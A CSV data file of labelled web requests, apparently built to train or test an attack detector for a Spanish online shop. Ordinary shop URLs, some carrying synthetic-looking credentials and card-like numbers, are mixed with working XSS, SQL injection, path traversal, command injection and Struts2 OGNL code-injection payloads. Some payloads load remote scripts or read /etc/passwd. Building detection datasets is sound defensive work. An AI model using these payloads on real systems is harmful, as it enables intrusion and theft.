payload,type
publico/miembros.jsp,normal
"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(1)"">DEF",xss
../../../../../../{FILE},traversal
global/estilos.css,normal
"<img src=x\x09onerror=""javascript:alert(1)"">",xss
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},traversal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",sqli
""" or isNULL(1/0) /*",sqli
"s1?s: select * from users where id=1 or ""1]"" or 1=1 -- 1",sqli
global/titulo.jsp,normal
&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;,xss
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",sqli
miembros/index.jsp,normal
global/menum.jsp,normal
global/creditos.jsp,normal
..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,traversal
&#X3C,xss
miembros/imagenes/ogono.jpg,normal
..........................................................................\..\..\..\..\..\..\{FILE},traversal
"s,?s: select * from users where id=1 or "",?"" or 1=1 -- 1",sqli
"&lt;?import namespace=\""t\"" implementation=\""#default#time2\""&gt;",xss
"&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\""&gt;",xss
imagenes/logo.gif,normal
\..\..\..\..\..\..\WINDOWS\win.ini,traversal
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"";>;",xss
miembros/fotos.jsp,normal
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
miembros/index.jsp,normal
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},xss
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>,xss
imagenes/2.gif,normal
"s:(s: select * from users where id=1 or "":(""=1 or 1=1 -- 1",sqli
miembros/salir.jsp,normal
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=36&B1=A%F1adir+al+carrito,normal
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
imagenes/3.gif,normal
"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",xss
"'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --",sqli
imagenes/cmenbul.gif,normal
global/titulo.jsp,normal
global/menum.jsp,normal
"window.alert(""Bonjour !"");   ",xss
<script>alert('xss')</script>,xss
<script ~~~>alert(0%0)</script ~~~>,xss
"`""'><img src=xxx:x onerror\x0D=javascript:alert(1)>",xss
publico/caracteristicas.jsp?id=2,normal
&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
"sUEo.: select * from users where id='1' union select +\.,@@VERSION -- 1'",sqli
../../../../../../../../../../../../localstart.asp,traversal
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
alert(1),xss
index.jsp,normal
imagenes/2.gif,normal
publico/autenticar.jsp?modo=entrar&login=cetraro&pwd=eSqUILero&remember=off&B1=Entrar,normal
&#X000003c,xss
"s,.s: select * from users where id=1 or "",."" or 1=1 -- 1",sqli
('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(\43req.getRealPath(%22\u005c%22))')(d))&(i99)(('\43xman.getWriter().close()')(d)),code_injection
publico/productos.jsp,normal
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,xss
"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
miembros/imagenes/zarauz.jpg,normal
create user name identified by pass123 temporary tablespace temp default tablespace users; ,sqli
miembros/salir.jsp,normal
imagenes/cmenbul.gif,normal
publico/carrito.jsp,normal
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
"<img \x12src=x onerror=""javascript:alert(1)"">",xss
publico/miembros.jsp,normal
"s{(s: select * from users where id=1 or ""{(""=1 or 1=1 -- 1",sqli
./\/././\/././\/././\/./{FILE},traversal
global/menum.jsp,normal
a)|id;,command_injection
publico/productos.jsp,normal
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<style type=""text/css"">BODY{background:url(""javascript:document.vulnerable=true"")}</style>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/imagenes/zarauz.jpg,normal
miembros/salir.jsp,normal
publico/caracteristicas.jsp?id=1,normal
<style>@import'http://www.securitycompass.com/xss.css';</style>,xss
imagenes/logo.gif,normal
"<img src=""mocha:document.vulnerable=true;"">",xss
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss
miembros/salir.jsp,normal
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
<BODY ONLOAD=alert('hellox worldss')>,xss
"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",xss
&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;,xss
"sUEn.: select * from users where id='1' union select $ .,@@VERSION -- 1'",sqli
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/imagenes/zarauz.jpg,normal
publico/carrito.jsp,normal
imagenes/3.gif,normal
&no.&: select * from users where id=1 or $<\. or 1=1 -- 1,sqli
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",xss
index.jsp,normal
publico/caracteristicas.jsp?id=2,normal
miembros/editar.jsp?modo=registro&login=door&password=-pantufla&nombre=Godofredo&apellidos=Ostapovich+Furnari&email=marlow%40botilleria.com.ec&dni=03291016S&direccion=Calle+Petunias+34+1-E&ciudad=Boada&cp=12480&provincia=Zamora&ntc=4231744159905009&B1=Registrar,normal
<script x> alert(1) </script 1=2,xss
&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
publico/pagar.jsp?modo=insertar&precio=7081&B1=Confirmar,normal
"sovvU: select * from users where id='1' + @ @1 union select 1,version() -- 1'",sqli
&#x00003c;,xss
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=90&B1=A%F1adir+al+carrito,normal
miembros/fotos.jsp,normal
"&o1UE: select * from users where id=1 or \<1 union select 1,@@VERSION -- 1",sqli
imagenes/3.gif,normal
publico/productos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
global/estilos.css,normal
<IMG%20SRC=javascript:alert('XSS')>,xss
publico/productos.jsp,normal
"sonnU: select * from users where id='1' <@$_ union select 1,version() -- 1'",sqli
"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",xss
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
miembros/fotos.jsp,normal
imagenes/3.gif,normal
<;/br style=a:expression(alert())>;,xss
../../../../../../../../{FILE},traversal
imagenes/cmenbul.gif,normal
miembros/imagenes/zarauz.jpg,normal
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../{FILE},traversal
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=20&B1=A%F1adir+al+carrito,normal
miembros/fotos.jsp,normal
miembros/imagenes/ogono.jpg,normal
"admin"" or ""1""=""1""#",sqli
miembros/imagenes/ogono.jpg,normal
"s??s: select * from users where id=1 or ""??"" or 1=1 -- 1",sqli
global/creditos.jsp,normal
"<html xmlns:xss><?import namespace=""xss"" implementation=""httP://ha.ckers.org/xss.htc""><xss:xss>xss</xss:xss></html>",xss
..//..//..//..//..//{FILE},traversal
miembros/editar.jsp?modo=registro&login=brana&password=holgachona&nombre=Romana&apellidos=Cabal+Urrupa%EDn&email=quest%40palmatraducciones.pw&dni=58157080Q&direccion=Lopez+Castrillon+162+&ciudad=Zambrana&cp=46688&provincia=Navarra&ntc=7449583219109875&B1=Registrar,normal
".&vUE: select * from users where id=1.&&@ union select 1,version() -- 1",sqli
"ooUEv: select * from users where id=1 <@<@ union select null,version() -- 1",sqli
..\{FILE},traversal
publico/pagar.jsp?modo=insertar&precio=6194&B1=Pasar+por+caja,normal
publico/carrito.jsp,normal
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;,xss
"&lt;BGSOUND SRC=\""javascript&#058;alert('XSS');\""&gt;",xss
miembros/editar.jsp?modo=registro&login=committe&password=94cl09at8va&nombre=Ornella&apellidos=Cusell+Vinageras&email=hervert%40clinicadentalsansalvador.ch&dni=37156228G&direccion=C%2F+Quilichao+85+&ciudad=Vallclara&cp=03786&provincia=C%E1ceres&ntc=6966776615880147&B1=Registrar,normal
"<TABLE><TD BACKGROUND=""javascript:javascript:alert(1)"">",xss
&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;,xss
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;,xss
publico/carrito.jsp,normal
miembros/imagenes/ogono.jpg,normal
"<;STYLE>;li {list-style-image: url("";javascript:alert(&#39;XSS&#39;)"";);}<;/STYLE>;<;UL>;<;LI>;XSS",xss
"<IMG SRC=x onemptied=""alert(String.fromCharCode(88,83,83))"">",xss
"<LAYER SRC=""javascript:document.vulnerable=true;""></LAYER>",xss
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
"<script charset=""\x22>javascript:alert(1)</script>",xss
"';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}"");}",xss
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera},xss
"`""'><img src=xxx:x onerror\x09=javascript:alert(1)>",xss
publico/productos.jsp,normal
<script ^__^>alert(String.fromCharCode(49))</script ^__^,xss
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">   ",xss
"<img SRC="" &#14; javascript:document.vulnerable=true;"">",xss
&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;,xss
global/titulo.jsp,normal
".UE1k: select * from users where id=1. union select 1,banner from v$version where rownum=1 -- 1",sqli
imagenes/3.gif,normal
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=28&B1=A%F1adir+al+carrito,normal
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
imagenes/logo.gif,normal
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0; URL=http://;URL=javascript:alert(';XSS';);"";>;",xss
imagenes/cmenbul.gif,normal
global/creditos.jsp,normal
"""hi"""") or (""""a""""=""""a""",sqli
imagenes/2.gif,normal
<BODY ONLOAD=alert(’XSS’)>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
<script>javascript:alert(1)</script>,xss
........................................................................../../../../../../../../{FILE},traversal
miembros/imagenes/zarauz.jpg,normal
"<? foo=""><x foo='?><script>alert(1)</script>'>"">",xss
global/titulo.jsp,normal
miembros/fotos.jsp,normal
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
imagenes/2.gif,normal
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
publico/carrito.jsp,normal
miembros/imagenes/castro.jpg,normal
miembros/imagenes/castro.jpg,normal
index.jsp,normal
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss
miembros/fotos.jsp,normal
imagenes/3.gif,normal
miembros/salir.jsp,normal
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
publico/registro.jsp?modo=registro&login=ehrenfri&password=4l6AD1E14&nombre=Ail%E9n&apellidos=Amaro&email=antone1%40tiendasyofertas.ve&dni=97233442E&direccion=C%2F+Artazuri%F1a%2C+43+10%3FE&ciudad=Talarrubias&cp=03400&provincia=Granada&ntc=8954375699794509&B1=Registrar,normal
'||utl_http.request('httP://192.168.1.1/')||',sqli
"aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""",xss
imagenes/3.gif,normal
publico/productos.jsp,normal
global/estilos.css,normal
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;,xss
miembros/imagenes/ogono.jpg,normal
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,sqli
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,traversal
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/autenticar.jsp?modo=entrar&login=raudres&pwd=s%21u2ceP7ivo&remember=off&B1=Entrar,normal
miembros/imagenes/zarauz.jpg,normal
%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE},traversal
imagenes/logo.gif,normal
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE},traversal
miembros/imagenes/castro.jpg,normal
%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE},traversal
miembros/index.jsp,normal
%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
miembros/imagenes/ogono.jpg,normal
"s&.oU: select * from users where id='1' or \.<\ union select 1,@@VERSION -- 1'",sqli
;id;,command_injection
"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",xss
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss
"<img src=""x` `<script>javascript:alert(1)</script>""` `>",xss
"""`'><script>\xE3\x80\x80javascript:alert(1)</script>",xss
imagenes/1.gif,normal
..\\..\\..\\..\\{FILE},traversal
"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",xss
imagenes/logo.gif,normal
"&lt;A HREF=\""javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\""&gt;XSS&lt;/A&gt;",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/salir.jsp,normal
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
""") or (""x"")=(""x",sqli
sleep(9999),sqli
<--`<img/src=` onerror=alert(1)> --!>,xss
%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE},traversal
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},traversal
||/usr/bin/id;,command_injection
"<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",xss
imagenes/cmenbul.gif,normal
imagenes/cmenbul.gif,normal
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
1%0d%0a1${(#x0='multipart/form-data').(#a1=14293212).(#a2=3009821).(#a3=#a1+#a2).(#a4='ttpServletResponse').(#a6='com.opensymph').(#a5='ony.xwork2.dispatcher.H').(#a7=#a6+#a5+#a4).(#a8='1n').(#a9='_ks3').(#a10=#a9+#a8).(#x1=#context[#a7].getWriter()).(#x1.print(#a3+#a10)).(#x1.close())},code_injection
..%2f..%2f..%2f..%2f..%2f..%2f{FILE},traversal
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,traversal
global/estilos.css,normal
"<IMG SRC=""javascript:javascript:alert(1)""",xss
"<a href=""\xE1\x9A\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
publico/autenticar.jsp?modo=entrar&login=macinnes&pwd=18vi5i9ad&remember=on&B1=Entrar,normal
imagenes/3.gif,normal
" or 1=1 or """"=",sqli
miembros/fotos.jsp,normal
&#60;IMG SRC&#61;JaVaScRiPt&#58;alert&#40;&#39;XSS&#39;&#41;&#62;,xss
"<;STYLE>;BODY{-moz-binding:url("";http://ha.ckers.org/xssmoz.xml#xss"";)}<;/STYLE>;",xss
publico/pagar.jsp?modo=insertar&precio=8998&B1=Pasar+por+caja,normal
..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",xss
&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
../../../../../../../../../etc/passwd,traversal
"&lt;A HREF=\""http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\""&gt;XSS&lt;/A&gt;",xss
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},traversal
miembros/imagenes/zarauz.jpg,normal
"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss
miembros/index.jsp,normal
publico/caracteristicas.jsp?id=2,normal
\nid|,command_injection
"ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(1)"">DEF",xss
imagenes/cmenbul.gif,normal
miembros/imagenes/ogono.jpg,normal
miembros/editar.jsp?modo=registro&login=maurie&password=0StroP5je0&nombre=Vlentina&apellidos=Fisas&email=marlaud_losee5%40redesmilitantes.tf&dni=54430634F&direccion=Viseu+81+8%3FC&ciudad=Corbera+d%27Ebre&cp=48210&provincia=Murcia&ntc=4713791605534130&B1=Registrar,normal
"<div STYLE=""background-image: url(javascript:document.vulnerable=true;)"">",xss
"'"">><script>alert('XSS')</script>   ",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"&lt;IMG LOWSRC=\""javascript&#058;alert('XSS')\""&gt;",xss
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"",",xss
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,xss
miembros/salir.jsp,normal
miembros/imagenes/zarauz.jpg,normal
"""<!--#exec cmd=""""/bin/echo '<SCR'""""--><!--#exec cmd=""""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""""-->""",xss
<isindex/autofocus/onfocus=alert()>,xss
"`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",xss
&#X0003C;,xss
global/estilos.css,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",sqli
../../../{FILE},traversal
imagenes/cmenbul.gif,normal
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=66&B1=A%F1adir+al+carrito,normal
miembros/imagenes/ogono.jpg,normal
"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",xss
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",xss
"s.UEv: select * from users where id=1 or 1#"". union select null,version() -- 1",sqli
"s{)s: select * from users where id=1 or ""{)"" or 1=1 -- 1",sqli
"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",xss
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,xss
..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},traversal
&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;,xss
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE},traversal
global/titulo.jsp,normal
admin') or ('1'='1'--,sqli
///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal
"<a href=""javascript#document.vulnerable=true;"">",xss
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss
"""<IMG SRC='vbscript:msgbox(""""XSS"""")'>""",xss
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE},traversal
miembros/imagenes/zarauz.jpg,normal
"<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>",xss
"<SCRIPT>document.write(""XSS"");</SCRIPT>",xss
&#60;XML SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xsstest.xml&#34; ID&#61;I&#62;&#60;&#47;XML&#62; &#60;SPAN DATASRC&#61;&#35;I DATAFLD&#61;C DATAFORMATAS&#61;HTML&#62;&#60;&#47;SPAN&#62;,xss
index.jsp,normal
"`""'><img src='#\x27 onerror=javascript:alert(1)>",xss
imagenes/cmenbul.gif,normal
..%5c{FILE},traversal
publico/carrito.jsp,normal
imagenes/logo.gif,normal
0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE},traversal
<~/XSS STYLE=xss:expression(alert('XSS'))>,xss
"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/autenticar.jsp?modo=entrar&login=feutlins&pwd=laga_rtijo&remember=on&B1=Entrar,normal
imagenes/logo.gif,normal
imagenes/3.gif,normal
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,traversal
"<IMG SRC=""javascript:alert('XSS')""",xss
<script>+-+-1-+-+alert(1)</script>,xss
global/titulo.jsp,normal
miembros/imagenes/ogono.jpg,normal
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},xss
&#60;IMG SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;,xss
publico/caracteristicas.jsp?id=1,normal
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,xss
publico/autenticar.jsp?modo=entrar&login=koontz&pwd=enriquecedora&remember=off&B1=Entrar,normal
miembros/imagenes/zarauz.jpg,normal
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",xss
"s)v: select * from users where id=1 or "")@"" or 1=1 -- 1",sqli
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
publico/autenticar.jsp?modo=entrar&login=ninnette&pwd=gAs40SO&remember=on&B1=Entrar,normal
miembros/fotos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
